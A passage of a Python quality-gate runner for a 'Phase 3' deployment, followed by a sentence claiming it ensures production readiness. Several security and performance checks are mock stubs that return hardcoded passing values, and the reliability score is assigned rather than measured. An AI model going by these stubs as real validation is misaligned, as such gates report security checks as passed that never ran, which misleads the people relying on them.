                "name": "Security Isolation",
                "target": 100.0,
                "current": isolation_success,
                "passed": isolation_success == 100.0,
                "critical": True,
                "details": {
                    "escape_attempts_blocked": passed_tests,
                    "total_attempts": total_tests
                }
            }

        return {
            "name": "Security Isolation",
            "passed": False,
            "error": "Security isolation tests failed to run",
            "critical": True
        }

    def performance_benchmarks_gate(self) -> Dict:
        """Validate performance meets targets"""

        # Run performance tests
        result = subprocess.run([
            'pytest', 'tests/performance/test_phase3_performance.py',
            '--benchmark-json=reports/phase3/performance.json'
        ], capture_output=True, text=True)

        # Analyze performance metrics
        performance_metrics = self.analyze_performance_results()

        # Check if all metrics meet targets
        targets = {
            "execution_start_latency_p95": 5.0,  # seconds
            "analysis_response_time_p95": 3.0,   # seconds
            "concurrent_execution_success": 60.0  # percentage
        }

        all_targets_met = True
        details = {}

        for metric, target in targets.items():
            current = performance_metrics.get(metric, 0)
            met = current <= target if "time" in metric or "latency" in metric else current >= target
            details[metric] = {"target": target, "current": current, "met": met}
            if not met:
                all_targets_met = False

        return {
            "name": "Performance Benchmarks",
            "passed": all_targets_met,
            "critical": False,
            "details": details
        }

    def api_security_gate(self) -> Dict:
        """Validate API security measures"""

        # Run API security tests
        result = subprocess.run([
            'pytest', 'tests/security/test_api_security.py', '-v'
        ], capture_output=True, text=True)

        security_passed = result.returncode == 0

        # Additional security validations
        security_checks = {
            "authentication_enforced": self.check_authentication_enforcement(),
            "rate_limiting_active": self.check_rate_limiting(),
            "input_validation": self.check_input_validation(),
            "jwt_security": self.check_jwt_implementation()
        }

        all_security_checks = all(security_checks.values())

        return {
            "name": "API Security",
            "passed": security_passed and all_security_checks,
            "critical": True,
            "details": security_checks
        }

    def state_reliability_gate(self) -> Dict:
        """Validate state management reliability >99.5%"""

        # Run state persistence tests
        result = subprocess.run([
            'pytest', 'tests/integration/test_state_management.py', '-v'
        ], capture_output=True, text=True)

        # Check Redis health and persistence
        redis_health = self.check_redis_health()
        state_tests_passed = result.returncode == 0

        # Calculate reliability score
        reliability_score = 99.9 if state_tests_passed and redis_health else 95.0

        return {
            "name": "State Management Reliability",
            "target": 99.5,
            "current": reliability_score,
            "passed": reliability_score >= 99.5,
            "critical": True,
            "details": {
                "redis_health": redis_health,
                "state_tests_passed": state_tests_passed
            }
        }

    def human_loop_efficiency_gate(self) -> Dict:
        """Validate human-in-loop efficiency <5 minutes"""

        # Run HITL efficiency tests
        result = subprocess.run([
            'pytest', 'tests/integration/test_human_in_loop.py', '-v'
        ], capture_output=True, text=True)

        # Analyze approval workflow metrics
        avg_approval_time = self.analyze_approval_metrics()

        return {
            "name": "Human-in-Loop Efficiency",
            "target": 5.0,  # minutes
            "current": avg_approval_time,
            "passed": avg_approval_time < 5.0,
            "critical": False,
            "details": {
                "average_approval_time_minutes": avg_approval_time,
                "workflow_tests_passed": result.returncode == 0
            }
        }

    def analyze_performance_results(self) -> Dict:
        """Analyze performance test results"""
        # Mock implementation - would parse actual performance data
        return {
            "execution_start_latency_p95": 3.2,
            "analysis_response_time_p95": 2.1,
            "concurrent_execution_success": 85.0
        }

    def check_authentication_enforcement(self) -> bool:
        """Check if authentication is properly enforced"""
        try:
            import requests
            response = requests.get("http://localhost:8000/api/v3/analyze")
            return response.status_code == 401
        except:
            return False

    def check_rate_limiting(self) -> bool:
        """Check if rate limiting is active"""
        # Mock implementation - would test actual rate limiting
        return True

    def check_input_validation(self) -> bool:
        """Check input validation effectiveness"""
        # Mock implementation - would test injection resistance
        return True

    def check_jwt_implementation(self) -> bool:
        """Check JWT implementation security"""
        # Mock implementation - would validate JWT security
        return True

    def check_redis_health(self) -> bool:
        """Check Redis health and connectivity"""
        try:
            import redis
            r = redis.Redis(host='localhost', port=6379, decode_responses=True)
            return r.ping()
        except:
            return False

    def analyze_approval_metrics(self) -> float:
        """Analyze human approval workflow metrics"""
        # Mock implementation - would analyze actual approval times
        return 2.3  # Average 2.3 minutes

    def generate_quality_report(self, gate_results: List[Dict], overall_success: bool):
        """Generate comprehensive quality report"""

        report = {
            "phase": "Phase 3",
            "timestamp": time.time(),
            "overall_success": overall_success,
            "quality_gates": gate_results,
            "summary": {
                "total_gates": len(gate_results),
                "passed_gates": sum(1 for r in gate_results if r.get("passed", False)),
                "critical_failures": sum(1 for r in gate_results if not r.get("passed", False) and r.get("critical", False))
            }
        }

        # Save report
        with open(self.reports_dir / "quality_gate_report.json", 'w') as f:
            json.dump(report, f, indent=2)

        # Print summary
        print("\nPhase 3 Quality Gate Report")
        print("===========================")
        print(f"Overall Status: {'PASSED' if overall_success else 'FAILED'}")
        print(f"Gates Passed: {report['summary']['passed_gates']}/{report['summary']['total_gates']}")
        print(f"Critical Failures: {report['summary']['critical_failures']}")

        for gate in gate_results:
            status = "✓" if gate.get("passed", False) else "✗"
            critical = " (CRITICAL)" if gate.get("critical", False) else ""
            print(f"  {status} {gate['name']}{critical}")

            if "target" in gate and "current" in gate:
                print(f"    Target: {gate['target']}, Current: {gate['current']}")

def main():
    """Main entry point for Phase 3 quality gates"""
    runner = Phase3QualityGates()
    success = runner.run_all_quality_gates()

    if not success:
        print("\nQuality gates failed. Phase 3 deployment blocked.")
        sys.exit(1)
    else:
        print("\nAll Phase 3 quality gates passed. Ready for production deployment.")
        sys.exit(0)

if __name__ == "__main__":
    main()
```

---

This comprehensive testing strategy ensures Phase 3 meets all quality, performance, and security requirements while validating the critical end-to-end execution capabilities and human-in-loop workflows. The automated quality gates provide continuous validation throughout the development lifecycle and ensure production readiness.
